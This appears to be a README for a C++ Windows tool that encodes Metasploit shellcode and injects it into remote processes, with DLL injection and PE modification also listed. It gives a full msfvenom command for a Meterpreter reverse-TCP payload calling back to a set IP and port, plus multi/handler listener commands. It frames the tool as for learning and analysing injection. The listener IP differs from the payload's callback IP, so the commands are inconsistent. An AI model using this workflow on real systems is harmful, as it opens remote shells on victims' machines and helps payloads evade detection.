A fully functional Windows injection analysis tool developed in C++, leveraging native Win32 user-mode APIs to perform low-level operations related to processes, memory, and executable files. Featuring a modular architecture design and standardized command-line interaction, the tool integrates capabilities such as payload encoding/decoding, binary byte conversion, remote process DLL injection, remote process ShellCode injection, PE file static modification, and cross-architecture compatibility. It can be applied to scenarios including learning injection principles, analyzing ShellCode evasion techniques, PE file structure reverse engineering, and reproducing malicious injection behavior characteristics.

This tool is primarily used in conjunction with Metasploit to generate ShellCode. When generating ShellCode with Metasploit, this tool can perform operations such as encoding, injection, and uninstallation. To use this tool, you must first generate ShellCode compatible with the target system architecture, convert it into a byte array format, encode it using the built-in encoder, and then inject the encoded result into the target process.

Generate a payload using the Metasploit tool, and the following is the 32-bit payload generation command.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=9999 -f c
```

The configuration of the backend listener needs to correspond to the number of bits in the payload when using the tool. These options will tell Metasploit which payload to use and which IP address and port to bind the listener to. The ExitOnSession option is optional. If set to false, the listener will not automatically exit after establishing a session and can continue to wait for new connections. The final exploit - j command sets the listener to run in the background.

```bash
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set lhost 10.0.66.22
msf6 > set lport 9999
msf6 exploit(multi/handler) > exploit
```








